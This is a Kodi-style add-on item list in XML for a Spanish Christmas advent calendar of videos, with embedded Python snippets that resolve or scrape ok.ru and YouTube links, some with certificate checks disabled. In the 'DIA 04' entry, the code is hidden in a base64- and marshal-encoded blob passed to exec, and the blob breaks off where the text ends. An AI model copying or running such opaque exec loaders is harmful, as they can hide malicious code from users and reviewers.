<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

<item>
<title>[B][COLOR gold]VUESTRAS CREACIONES[/COLOR][/B]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/fcMtyL0.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<externallink>https://pastebin.com/raw/H2TAs5Fs</externallink>
</item>


<item>
<title>[B][COLOR red]DIA 01[/COLOR] [COLOR white]MENSAJE DE PAPA NOEL[/COLOR][/B]</title>
<link>$doregex[id3]</link>
<regex>
<name>id3</name>

<expres><![CDATA[#$pyFunction

def GetLSProData(page_data,Cookie_Jar,m):

   import resolveurl

   url = 'https://ok.ru/video/2044667562660'

   try:

       u = resolveurl.resolve(url)

   except:

       u = ''

   return u

]]></expres>

<page></page>

</regex> 
<thumbnail>https://i.imgur.com/TanrSTX.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>


<item>
<title>[B][COLOR red]DIA 02[/COLOR] [COLOR white]MANUALIDADES[/COLOR][/B]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR red]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://www.youtube.com/watch?v=HqgvCuu82IA&list=PLHIVSRNAg7cko8jRghW71fiho-TWyQ-2j'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/dzvFmjW.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>



<item>
<title>[B][COLOR red]DIA 03[/COLOR] [COLOR white]ESCRIBIR CARTA A PAPA NOEL[/COLOR][/B]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=BvbsvthaNg8'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/Ae9ouvV.png</thumbnail>
<fanart>https://i.imgur.com/PAjbyGX.jpg</fanart>
<info>@addonfestaycristal</info>
</item>




<item>
<title>[B][COLOR red]DIA 04[/COLOR] [COLOR white]SESION DE CINE.[/COLOR][/B]</title>
<link>$doregex[c]</link>
<regex>
<name>c</name>
<listrepeat><![CDATA[
<title>[c.param1]</title>
<genre>[c.param2]</genre>
<year>[c.param3]</year>
<info>[c.param6]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[c.param4]</thumbnail>
<fanart>[c.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,xbmc,xbmcaddon,xbmcgui,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>multi_server</name>
<expres><![CDATA[#$pyFunction
url = '[c.param7]'
import xbmc,xbmcaddon,xbmcgui,re,json
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MGd3MEFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT1ZGa3lXa1JWZDAxNlVUTk5lbGsxVG1wRk1rNXFWWHBOYlVrelRVUktiVTE2UVRCYVZGSm9UWHByZWs1cVVUTk5lbGt5VGtSVk1rNTZUVEpaVkZKcVRYcFZNRTFVVFhwT2JVa3lUVlJXYUU1RVp6Qk5lbU13VG5wQk1rMXFVVE5PUkVVeVRtcFpNMDVFVVRKT1JGSnBUbXBuTWs1cVdUTk9SR015V2xSTmQwMTZVVEphUkdNMFRucGpNazVFVVhwT1ZFVXhUMFJhYkUxNlkzcFBWRlYzVGxSWmVrOVVWWGhPVkZreVRXcE5lazV0V1RKTlZGcG9UbFJGTVUxRVRUUk5lbEV3VFhwWmVrNXFVVEpaYWxWNVRYcG5lazlFV1RGTmVrVXpUMFJWTUU1NlZURk5WRXB0VGxSQk1rOUVXVEZPYlZWNVdtcFZkMDU2WnpKTlZHTXlUa1JuZWs1NldURk9SRkV6V1ZSTk5VMTZaM2xaYW1ONlRtcFJNbHBVVW1oTmVrMHdUbXBLYlUxdFNURk5SRlV3VGtSUk0wMUVUWGRPVkVFeFRrUmFiRTU2UlhsWmFrMTZUakpGZVZwcVl6Sk9hbEY2VG5wTk5FNVVaekZPUkUweFRrZFpNazVxVlhkT1IxVXdUWHBWZDAxdFdYbGFhbFUxVG1wUk1VMUVaR2hPYWxreVdsUlplRTU2V1RKUFJGa3lUWHBOZWsxNlpHaE5iVmw1V21wTk5FNTZXVEpaYWxKcVRrUm5lVmxxV1hsTmVrVXpUbXBhYWs1dFRYbFphbFY2VGtSbk1rNUVaR2hOZWxVd1dXcE5NRTF0V1ROT1JGbDZUa2RGTTFsVVl6Uk9WR042VFdwV2FFNVVTVE5OUkUxNVRYcEpNMDE2VW10T1IwbDZUV3BOZWs1cVNYbGFhbEpyVGxSQmVWcHFVbWhPVkZFeFRucFJNMDVxUlRCYVZGSnJUWHBuTWxwcVdtbE5la0Y2VGtSU2FFNXFXWHBPVkUxM1RYcHJlazU2WXpCT01rVjZUbnBaTTA1VVl6Sk9WRTE1VGtkVk0wMVVVbXROZWxVd1drUk5ORTVVVVROT2FsVXpUbnBSTVU5RVl6Rk9SMUV4V1ZSTmQwNXFTVEpPUkZVMVRucE5lazFVWXpCT2FrbDVXbXBqZVU1cVVUTlpWR013VFhwTk1scHFTbWxPYWswd1RXcGFhMDF0V1RCYVZGa3lUbXBOTVU1NlVYcE9ha2t4VFdwS2FVMTZUVEJQVkUwMFRtMVJNbGxxWTNwT2Vra3dXbFJaZWs1VVNUSmFhazB3VFhwUk1sbDZZekpPVkZFeFRrUlZOVTVIU1RCWmFtUm9Ua2RaTVU5RVVYcE9hbGw2VG1wak1VMTZWVEJPYWxFeFRYcEJlazE2VVhsT1ZFMHhUbnBOZWsxNlVUSlBWRlY1VG1wRk1rMXFVbWxPVkUweVQwUk5lVTVVWXpGT2FsVTFUbXBuZWsxNlVUTk9lbEY2VG5wWmVFNVhSVEJaVkZsNFRtMVJlazVVWTNsT1JHY3dXVlJqTUU1VVl6RlBWRlUwVGtSUk0wMTZXVFJPUjAweVdWUlNhMDVxWnpCUFJGa3dUa1JWTTA1cVVtMU9lbXN4VFdwUmVFNTZhekZQVkZGNFRYcFZNbHBVV1RST2FsRXdXbXBhYWs1dFVYbFphbEpvVFhwVk1GcFVXbXBPYlZGNlRtcGFiVTVYUlRGT2VsSnJUWHBSTWs5VVVUSk9SRmt5V21wUk5VNXRWVEphVkZFeVRucFpNbGxVV1hsT1ZHTjZUVVJaTWs1Nll6Sk5lazAwVFhwbk1VMXFVWGhOZW1jelRVUlpNazVVWTNwT1ZGazBUWHBOTTFsVVkzcE9WRVY1V1dwS2FVNVVZM3BPYWxwcFRucEJNbGxxWXpCT1JGRXdUVlJLYlU1cVl6Rk5SRmt4VGxSSk0xbFVVVE5PVkdONlRXcGplazU2U1RCWmFtTXhUWHBaTVU1NlVYbE9hbEV4VGxSYWFVMXRTVEZPZWxVMVRYcFJNazE2U21sT2JWRXhUMVJaZUU1NmF6Rk9hbHBxVGxkRk1FNTZWVFJPVkVrd1dXcFNiRTVVV1RCT2VscHFUbFJCTWs1VVRYbE9la2t5VG1wak1VNVVRVEZOYWxwcFRrUlZNbHBFWTNoT1IwMTZUMFJaTUU1Nll6RlBSRkV6VGtSamVWbHFXVE5PUkZsNlRYcFZOVTU2UlhwT1JGVjNUbXBWZVZscVVtaE5lbU15V1ZSak1VMTZhekJOZWxVMFRtMU5NbHBFWkdoT2VtTjZUWHBWZVU1RVJURk9hbU0wVG0xSk1rNVVZelZPUjBVeVRWUmplRTU2WnpKYVZHTTFUWHBaTTAxNldYcE9SMDB3V1dwTmQwNVVSVEphYW1NMFRrUlJNMWxVWXpWT2VrVXdUbXBOZWs1dFVURk5WRlYzVG5wamVrMTZZM2xPYlZreFRVUmFiVTVxU1RKWmFtTXdUWHBKTVZsVVkzZE9iVTB5VGtSYWFFNUVVVEpQUkdSb1RYcHJNRmxxVFRKT1ZFRXpUbXBOTWs1dFJUTk9hbFV6VFhwQk1GbDZTbWxPYWtVd1RtcE5NVTVIVFRKT1JHTjRUbnBGTWs1VVZUVk9SMFV6V1ZSU2EwNXRVVEpPZWxWM1RXMVpNVTFxWTNwT2VsVXdUWHBaZUU1NlVUQk9hbEUwVG1wSk1VOVVUWGxPUkUxNVdtcFZNRTVFYXpGTlZFMDFUWHBaTWs5VVl6Tk9iVlV5V2tSak0wMTZZM2xhYWxWNFRucEJNMDU2V20xT2FsbDVXbXBhYVUxNmF6QlphazE1VG5wTk1rMTZXbWxPYlZWNlQwUmplRTVIU1hwUFZGRjZUbTFGTWs5RVRURk5lazB6VDFSTk1rNVVVVEJPUkZwb1RsUmpNMDlVV21wT2VrVXdXa1JhYTA1SFJUTk9WRnBwVGxSVmVWbHFWVE5PYWxreFRYcGFhMDVxWXpOTlZGVXdUbTFOTVZsVVZURk9lbU16VG5wTk5VNXRTVEphVkdNelRtcEplVnBxWXpOT1IwVjVXbXBhYVU1VVozcE9WRkUxVGxkRk1sbHFWWGxOZWxrelRucGFhazVxVlRCWlZGcHJUbTFSZWs5VVdtaE9WRUV4VGxSUk5FNTZRVEpOVkZVelRrZFpNazVFV1RWT2VsbDZUa1JWTUUxNlp6SmFWRnBwVGtSamVWbHFZelJPUkdjeVdtcFNiVTVVUVhwUFJGRXhUa1JuTVU5VVRUQk9iVTE2VDFSVmVFNTZUVEZOZW1ONlRrZFZNRTVxVlRWT1IwVXpUMVJaZWs1cVRYbFphbU42VGtSbk0wNXFWbWhPUkUwd1dsUlJOVTVFVVRKT2FtTjZUWHByTUU1Nll6Uk9SR3N3VG5wWk1VNXRVVEpaYW1NelRsUkZlazlFVFRKTmVrMHlUVlJOZUUxNlJUTlBWRTB5VG5wQk1FOUVVbXhPUkdNeVRtcGFhVTVVV1RKTmVtTTFUbGRGTWs1cVdYcE9SRlV3VDFSYWJFNXFXVE5OVkZWM1RtcG5NVTU2VVhoT2JWVXlXV3BaTTA1RVVUQk5WRnBzVFcxWk1sbHFXbXhOZWxrd1QxUlZlazF0V1RKT2FsVjRUa1JqZVZwcVkzZE9ha1V5V1hwUk1FNXFXVE5PZWxFelRXMVpNMDU2VW14TmVra3pUbnBrYUU1SFVUQk9lazB6VGtkRk1GbHFUVFZPUkdNelRXcFpNazVFVFROT2FsRXpUa1JSTWxwVVVURk9Na1V5V1hwUmVrMTZXVEJaYWxWNFRucEJNRnBxVlhoT2Fra3pXVlJTYVU1SFZYcFBSRnB0VFhwamVrOUVWWGxPYWtreldWUlplazE2UlROTlJGRjVUbFJWTWs1RVVtbE9WRUY2VG1wYWFVNXRTWHBQVkZwdFRXMVpNMDU2VlRCT2FtZDZUMFJhYVU1VWEzcE5lbU16VGxSVmVrMTZWVEpPUkZVd1QwUlNhazVFVlRKT2FrMHdUbXByTVUxVVZYcE9lbWN3VDBSak0wMTZaekZOVkZwb1RYcGplazVVV1RST2Vsa3hUV3BSTWs1dFZUQk5hbU41VGtSck1VNVVUWHBPYlZFd1RucFpOVTVxWnpKYVZGRXdUbTFWTWxsVVVUVk9SMVY2VDBSVmVVNXFhekpQUkUweFRucGpNazlFVFROT1JFa3lXbXBqTkU1VVVYcE5lbEY1VGtSRk1rMXFXbWhPYlZVeVRsUmplRTV0UlhwT1ZGRXdUbnByTWxscVl6Sk9ha1V3VG5wTmVrNTZSVEJPZWxwclRYcGpNRmw2VW1sT2Ftc3dUMVJLYlU1WFJUQk9hbU41VGtkTk1FOUVVbTFPUkZreFRrUmplVTE2WnpCTmFscHNUbnBWTTAxRVZYZE9hbXN3VFZSS2JVNXRXVEpPYW1NMVRtMVZNRnBxVW1oT1IwbDVXV3BaTlU1SFdUQmFhbFUxVG0xSk0wMUVUWGhPVkZFeVQxUmplazVxVVROUFZHTTBUa2ROTTAxVVVtbE5iVmt3VFZSWmVrMTZWVEJPUkZVMFRYcFJNRmxVV1RCT1JGVXdXWHBTYlU1NlNUTk5WRnBvVFcxSk1GbHFZM2xPZW1jeVRXcFpOVTVIUlROT1JGRXlUWHBuTVU5VVVtaE5lbXN3VDFSS2FVNVVWWHBOUkVwdFRrUmpNMDVVVlhsT1ZHY3hUVVJaTTA1Nlp6QlBWRlUwVG5wTk1sbHFUWGhPVkdzelRsUlNiVTVxV1RCT1JGSnBUbnBCZVZwcVl6Sk9SRWt3VGxSVmQwNTZRVEZPZW1NelRtMUZlVnBxVlRWTmVtc3pUbnBqZUUxNlVUSk5lbEpzVG5wUk1FNVVUVE5PYWxrd1dtcFNhMDVxYXpKWlZFMHhUbFJuZVZscVVUTk9hbFV5V21wVk1FNXFWVEZaVkdONlRucGpNMDlVV21wT2FsRXlUa1JqZUU1RVp6Tk5WRkV5VGxSQk1rOVVUVEJPYlZWNVdXcE5NVTVFVlRGTlJGSnRUbXBaTUU5VVZYcE9lbFV4VGxSak1rNXFXVEJaYWxreVRYcG5NazFVV1RWT2JVVjVXV3BaTVU1cWF6QmFSRkp0VGtkSmVrNXFXbWhPZWxFd1RXcGthRTVFVlRKTmFscHBUa1JSTTA1VVl6Tk9WR2Q2VFZSUmVFMTZaek5OZWsweFRrUlpNMDVVVVhwT2VsVXlXV3BWTWsxNmF6Tk5hbEY2VGpKRk1FNVVXVE5OYlVrelRucFpNMDF0V1hwT2FsRXhUVzFaTTAxcVVtaE9SR3N4VFZSTk0wMTZWVE5aVkdNMVRtcFJNRTE2VlRCTmVtc3dXa1JOTWs1NlNURk5SRTAwVGxSck1rNTZUVEpPUjBVeFRrUkthVTVVVVROT2Fsa3hUa1JaTVU1VVl6Vk9ha1V3VDBSTk5FNTZRVEZPUkZVelRsUmpNazVxVFRST1JGRjVXV3BOTkU1RVRYcFBSRTAxVGtkUk0wNTZVbXhOZWxreVdXcFJNazE2VFRGTlZGazBUVzFaTVUxNldtcE5lbU16VDFSUk5FNVVXVEJPUkZreVRucHJNRmw2WXpKT2JWa3hUWHBOTWs1VVNUTlpWRTE1VFhwbk1VMVVUVE5OYlVreFRXcE5NazV0VFRKWlZGcHFUa1JyZVZwcVl6Tk9iVWt3V1dwUk1VMTZaekphYWxFMFRYcG5NbGw2WXpKT2JVMHlUbFJqZDA1VVVYcE5SRkY0VG5wUmVWbHFZM2hOZWtreVQwUlpNazVxYXpKUFZFMHpUbFJSTTA5VVVtdE9ha1V5V1hwWk1FNXFVVEZOYWxVeFRtcFpNVTE2VW14TmJVa3lXa1JaZUU1NlNUSk9hbFV4VG5wRk1rMTZUVFJPUkZrd1RYcFZkMDVVWjNTRERRQUFNRTFSV2pKQmJWWXpRWGRFTVVGSFJHMUJSMGd3V25wTU1rRkhXakJCVVhneFdsRmFhMEZSVWpOQmQwMTZRVzEwYkUxM2NEVmFiVTR4V2tkYWFrRjNURzFDUjBnMVFWUk1iVUpSU0ROQmVsb3dRWGRYZWtGSFdqRkNVVVYyUVcxU01rSlJXakZhYlhBeVFrZE5lVnB0VWpGQlIwaHNXbnBXTWsxUlNHMUJWRkpzVFhkRU5VRjNWakpCVVVReVFYcE1iVnBIU0RCQlVYUnRXbmRJTTBGSFNESmFkM0EwUVhkd00wRjNSWFpCUjBReVdtMUVORnB0U0RCYVIwZzBXbTFNTUZwM1RERkJWRll3VEVkTmVVRjZUREJCVVZvMFFYZDBNa3h0V2pWQlIxWXdRVkZ3TkVGSFRETkNSM0JxUVZGYU0xcDNTR3hCZDBSdFFYZE1NMEY2U0RGTVIwd3dRVWRXTWt4SFRYWkJWRll5UVZGSU1VRkhUbXhNZDB3MFFVZE9iVUpSUkd0YWVreHRXbEZOZVZwdFRESkNVVm95UVcxYU1FRjNSWGRCUjBneVFrZElNRnB0VmpOYVIzQXhRVzFTTUV4dFdqUkJiVTR4UWxGd05FRlJUREZDVVZwclFYcEVNMXBSY0RKQmJVNHdRWGRJYlVGSFRtMWFVVVY0V25wV2JVSlJXbXBCZDBReVFYZElNVUZ0U0d4TWQwUnRXbnBNTUVGSGNYVmFiWGh0UVcxTmQwRlJUR3hOZDAxM1FXMUlNMXBIVFhsQmVrUXpRVkZGZDBGUmRERkJSM0F5UVZGSU1reDNjREpCUjNBd1dtMXdNa0ZIVGpCYWJVUTFRVzFNTUVGUlJYbEJSMHd3UWxGRU5VRkhWakpCVVZveFFYZDBNRXh0Y0d0QlVWb3dRVkZOZDBGSFNHeE1kM0JxUVVkMGJVRjNTREpCZWxZeFFsRmFNRUZIU0cxQlIxcHFRVzFPTUUxUmNHdEJVVkp0UWtkTmVVRjZXakJhUjBWNlFYcE1Na0ZSV2pGQlIwZ3lUVWRFTUVGM1JERkJSM0YxV20xd01FSkhSWFZCYlVneVRIZEVNMEZ0UkRGYWJVaHFXbTFTTUUxM1dqRkJSMFF5VFVkSU1rRlJSR3hOZDBoclFWRldNMEpSY0RWQlVWb3lRbEZ3TWtGdFVqRk1SMGcxUVcxRU0wSkhUWFpCVkVReVduZFhka0ZIU0cxYWJWbzFRVWQwTWtGM1NESkJiVnB0UWtkRmQwRlJTREZhYlV3eVFVZFNiVUZIV2pGQmQzQXhURWROZWtGSFNETmFVVVY0UVhkSU1reEhTRFJCYlZJeVRFZE1Na0ZSZUROQlIxZDJRWGR3TUV4SFdqVkJla1F4VEVkSWEwRlJWbXhOZDFwcVFVZFNiVUpSVERSYWVrd3pRa2RGZDBGSFREQmFiVm95UVhwSWJFeDNUWHBhYlhCdFFWRnhkVUZVVERCYVIwaHFRWGR3TUVKUldqRmFiWGd5UWtkSU5FRlJkRE5NUjFvelFYZEVNMXAzVFhwQmQwd3hRVkZhTUVGSFJESmFkMGhyV20xME1rRlJUWFpCVVVodFduZHdNRUV5VW0xYVIwVjJRWHBXTWxwM1NHcEJiVm93VEVad1FWQmhSV3h1U2pWamNWVjRkRU5HVG1GYWVtdEJTVkpUU2taSFNYZEJWV016U2xKMVJrSkxkVVp4U2xORlRUTjFXVVozZVUxTlNuUnNSMHBFTWt4SU9WWmFla2x1V2pOVE0yOUxlR3RCU0RGS2NrdDVlazEzUldaQlNEa3dSMVJKU0hKS1NHeEdNMDFQYnpGMVZVY3dSVFJDVW5GMWIyRlRUWEI2VTFGSU1EaHRSRWR4VFhCaGNYcHVWR2RrV2pOeFVtOUtPVXBZTUVScVFsRjVRa0Y2VFdKQllXTmFRVWQxTTBoUlRWWkhTblZOU1ROSldrRjVVMHRGTTNReFIxUk1NRWgyWjNWTmVVbHFSMGhJYTFwVFNYcEhSM0F6U2t0MWEwWjRTVEZ4U2xJeVIyeG5NMGd5Y1ZWYVMwVlpSVkpFTlc1NloyZHVZVWxxU0ZBNVkzQjRUVTlDVWxveVNWUjFaa3A1UlROSmVVbGlTREoxVVZwTFNYWkhWRGd3UjFSWFJYQXdZMWhhU0ZOMlIwaDFkbG95WTBOdlNYbDFTV0ZYV1VSMloxTnhVM2hsUlZGMGEzSjRWM3BIVldJd1IzcDVhMDE1Y1RCYVZERlRSVkowTUVkU1UybEtWREZyUkVsTldXNVVkVXRCTUV4dFRIbzFlVWxVZVdWSlNHTmhTVWxQYlhKSFJURnlTWGxGYmt0eFdVSlVWMUpNU0dkdVduaDFWWEo0UldWQk1FVlRRa2xUTVVkNVNVaEdlblZuY1RCRmFrZFRSRFZOZW5relRUSnhTM0I1ZVdKeVVWZFJRVkJuUlhCS1UxaEdla3cwV20xTU5ISjZjWGx2TUZKc1FVbzBiVVF3U1VsQk0xTjZUVzE1VEhCSU1XSnhNRm8wY0hkVE1IRXdkVTl4VVhGWGNUTkVNM0JMVFZWSWQzQnJSRWw1V1hCM1UybE5lRk5oUjBZNVQzRkxRV1ZCYlZkbGJ6TjFRVVF4VjJ4YWJYUnNia2xqWWtReFQyMUpiVUZRUkROUGFsa3plV2R3U0dkUlFWVlBkVVY0VmpKR1IwbHRXVEZhTVVoNE1URklWVTkyUWxWVFVVaHRRVXBhVVhWRGNYbEJZa1poWTJkRk0wRTJSMG81YWxreFkwcEtlbEp0VEVnMVkwRXhWMWhDVWtGMWNFZFhTMFF5YTJadVMzRlRTRWxYV0hFd2NXZHVVWGxZY1ZWWFEwSklNV3h1VVVGa2JsUjVNMjVSVFZkd01HczJjSGRCVUhCTFRVMVpNMU5HV25kd05HNHpXalZITUZkMVRXMVNaVzVUU1cxS1ZYRmFSVEp3YlUxaFUwbEhVbXQ0UmpJNGFVMTZaek5CWVU5MlFWTnhXWEF4VTBod01ERlZXbFExWjBkU1kybHVTSGwzV2pKWFdHNUtkVE5hYlU1cmNuWTVWMEpKVFZWQlZIRm5TRzFXYlVSM1RVaE1NbE5RU1cxUFowVXhjVFphUjAxNWIxRkpTRXBKUVdKTVNtZFJjVXQ1VFhBd1ltVkVNM1ZHYmtneE1FVmhZMGRDU2xaclNFZFRiRUV6ZEd4QlNGSnBTVWRFTTBKTFFXTkJNa1JsYjFGME1VMVRlWFZ5ZWpocVJUQXhVMjVVTVVwQ1NXTmljVW94UVVnelFUQkJiVWd5Y1RKSlVFZ3llVVZNTW1veVJsSnhkVVpLWjJwSlZFeGxSRE54ZGtneVozVkJSamxGYnpOUFNIRjNSV3R4YlZkbFFraGlhMHBIVTI1YWJVRmFSMHRYWjBwM1YwMUdSbVl4VFROYU5FZDRNVWh1TUhGWVJWUjVWRnA0UVdWYWVuVmlRa2gwTTBKSFQyRklSMFZFY2tkQk1Gb3dXbXhCYlV3MFRYZEZhRzloVWpSSk1FRXpRWFpuU1ZwSFJESmFTbXN4Y2twNVlVbFRTV2ROYlhsWlRVZ3daVzVKUlVOeGJYQnRibE5GUjBReVVtbElTVUZwYmxGSlZVWnRSRE5hU2xjelJsUnhZVXBHWjJkRVIxZFRjVWhpYTFvelJXbHZWVUZIUlhoclVWb3dkR3hHVW1JeVRHMTFiWEo2YTFSdVNqRldXbmxOUVhKS1YyaEtkM2xFY0ZKVFJVSkxZMnRNTUdObmJrdEpiVWxWU1RORlUzZzFUVWhYV0hGdFJHVndNa2xXUVRKWFpsa3dZMU52TW5GaFRVZFdha2xLU1VsdlZYVnJiM2c1YlV4NlkyRndVakZOYnpBNVkwbEhlREpOYkRsaFdsRkZTMFZ0Vm1wd2VIRlhURzE1VDNCNVYwMXZiRGxNY1dGV05FWXdNVkZDUjBsclIxRkJNbGx0ZVhwdU1VVXpXakJKTlhCVVJUWkllbXRtYjNoWFoweEplVk5HTUdkM1RFZFBWMjh5Y1daSVZWWnNURzE0WlVKSVNWVnVlVll4Y25oblVGcFZjV05DVW1OQmNsUlRTa0YzU1dsQ1IwRktXVE5CUVVWSlQyVnhiVk5TUjFRNVpWcGhZMkphTURWS1dtMUpaRVF5VFhsTmJWZG9ibFZqTTAxSFNVbEdiR2RGYmxSbmFVaElaMDl1VlZkRFFWRjBaWEIzU1RCeVNrMTRSbUZPTUVaTFYwdEpNalJxYjNvMGFsb3dVbVZJU25WdVdqSkJZbkIyWjI1RWVtZEhXbnBpYlc1SFQyRklTR1l6UmxWVGQxZ3lOVWh3U2xOTFRWUTRNSEF6VjBwTlNIQnBTSG81TlVKU1YwRnZSMU5zUlhnd2FWa3lOWGx1VkZZeVdqRkpOa3hJTVdKR1IwMVpURXBuWjI1VU9XVmFlbkZSVFhoMVJHOTZOR3hGU2tsaFNYaHhSVUZIZVV0S1VuVXhRVWxpYVVaNFUycEJVMk5pUmpGUGVFSkxZMlJHTURGbFFsSmlNM0JTY1dsd1UzRkVTbmhpTlZwSWRXdHhTRk5vUVROSmFHNVNjRFJIUzJOa1RFb3hUVUpIVGpGTk1YQnFXbmhKVWxwU01WSk5NRGd4Y1ZBNVpFcFFPVWRCVW10MWNURkJlVWxJVm14d2VsTjZiekpUU2xwUU9VRk1NM2hzUmpGRVpXNUxjVWhGTVZvMFdrdDBaVzk2U1cxSWVVRlBXVzFXWlVwR1oybHViWFZJU0RKSmJIRXdNVkZ5U21OdGNESlNORXhIU1d4TlNEQnRia2hUTVVkNFFVTnVTamxNY0hkWFoyNVVNR3RCVURrelNWUnJUMGd5VTFwR00zRjFXbTFQTlVaVGNYVnVlalZpYjFGVGJVWnRSV3hCTWpWNlJXRkpVRzVJTVdkRWQwNXBia2xYYm5KNGVEVndVbmxzYmtsNGJVMUdaakpDVW5WYVNsUndNVzVKY1hkeVNtZGhXa3BuWTBSTGRXcHVTalZEYjBoWFVYSjRjV3ROZW5sV1FWUkZaRVJoUVdORlZGTlhSRWRUZVZwVGRVOUpWREJxYjNwNVUzQkhlVWhaYlU5TVFrdFBiRnBTT0dsYVVYbEpXakpGU1VKS1NHdEtlbmxUY2tkNVNXOUhUMEpZYlhGSVdUSlhXSEF3VTFCYVNEbGpUSGhGWTI1SWRVaGFNa1UxUkRCMVUxZ3lPVlpKUjNsSVJtMU5iVmd6VFVOQmVVbHRUR0ZFWlhGMk9ERkVkMGd3UldGSVpYRXhlREpOVVU5U2NESkJXVWd3T1cxdk1GWXpXbFE1Tkc0d1NXMUNTVVZS